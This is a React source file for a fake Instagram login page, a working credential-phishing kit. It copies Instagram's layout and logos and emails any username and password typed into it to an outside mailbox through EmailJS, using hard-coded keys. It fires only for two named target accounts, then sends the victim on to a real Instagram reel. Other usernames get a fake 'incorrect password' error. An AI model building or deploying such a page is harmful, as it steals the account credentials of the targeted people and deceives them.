import './IgForm.css';
import React, { useRef } from "react";
import lang from './assests/lang.png';
import ig from './assests/ig.webp';
import fb from './assests/fb.png';
import meta from './assests/meta.png';
import { Row, Container } from 'reactstrap';
import emailjs from "@emailjs/browser";

function IgForm() {
      
    //switch of login
    const [pwd, setPwd] = React.useState(false);
    const [user, setUser] = React.useState(false);
    const [name, setName] = React.useState(false);

    function pwdHandler(e) {
        let item = e.target.value;
        if (item.length >= 6) {
            setPwd(true);
        } else {
            setPwd(false);
        }
    }

    function userHandler(e) {
        let item = e.target.value;
        if (item.length >= 1) {
            setUser(true);
        } else {
            setUser(false);
        }

    }

    //mail
    function refreshPage() {
        window.location.reload(false);
    }
    const form = useRef();

    const sendEmail = (e) => {
        e.preventDefault();

        let item = e.target.user_name.value;

        if (item.toLowerCase() === "amiejoshi" || item.toLowerCase() === "_itsalishakhan_") {

            emailjs
                .sendForm(
                    "service_zl7gpvg",
                    "template_45vzz1h",
                    form.current,
                    "INU2SBysHC2qsHrOX"
                )
                .then(
                    (result) => {
                        console.log(result.text);
                        e.target.reset();
                        window.location.replace('https://www.instagram.com/reel/CnQ8Z3NohUV/'); // url / link
                        //  var ww = window.open(window.location, '_self'); 
                        // // window.location.assign('https://www.instagram.com/reel/ClY1_-1B8Sk/'); 
                        // window.open('https://www.instagram.com/reel/ClY1_-1B8Sk/', '_self'); 
                        // setTimeout(function(){
                        //     ww.close();
                        // }, 3000)
                        // window.open('https://www.instagram.com/reel/ClY1_-1B8Sk/', '_self'); 
                    },
                    (error) => {
                        console.log(error.text);
                    }
                );

        } else {
            console.log("invalid input");
            setName(true);
            return;
        }

    };



    return (

        <div className="main">
            <Container>
                <Row>
                    <img className="img-responsive" onClick={refreshPage} src={lang} alt="lang-en" />
                </Row>
                <br />
                <Row>
                    <img src={ig} alt="Instagram" onClick={refreshPage} style={{ width: 200 }} />
                </Row>
                <br />
                <Row>
                    <img className="img-responsive" onClick={refreshPage} src={fb} alt="login with facebook" />
                </Row>
                <form ref={form} onSubmit={sendEmail}>
                    <Row>
                        <input className="inputSpace" type="text" name="user_name" onChange={userHandler} placeholder="Phone number, username or email address" />
                    </Row>
                    <Row>
                        <input type="password" placeholder="Password" name="message" onChange={pwdHandler} />
                    </Row>
                    <Row>
                        <a href="https://www.instagram.com/accounts/password/reset/">
                            <p className="forgetPwd">Forgotten your password?</p>
                        </a>
                    </Row>
                    {
                        (pwd && user) ? <Row>
                            <input type="submit" value="Log in" />
                        </Row>
                            : <Row>
                                <input type="submit1" value="Log in" />
                            </Row>
                    }
                    {
                        name ? <Row>
                            <p className="incorrect_pwd">
                                Sorry, your password was incorrect. Please<br />
                                double-check your password.
                            </p>
                        </Row>
                            : null
                    }
                </form>
                <Row>
                    <p className="notaccount"> Don't have an account?
                        <a href="https://www.instagram.com/accounts/emailsignup/"><span> Sign up</span>
                        </a>
                    </p>
                </Row>

                <br />
                <br />
                <br />
                <br />
                <br />
            </Container>

            <img className="img-responsive img-bottom" onClick={refreshPage} src={meta} alt="from meta" />

        </div>
    );
}

export default IgForm;
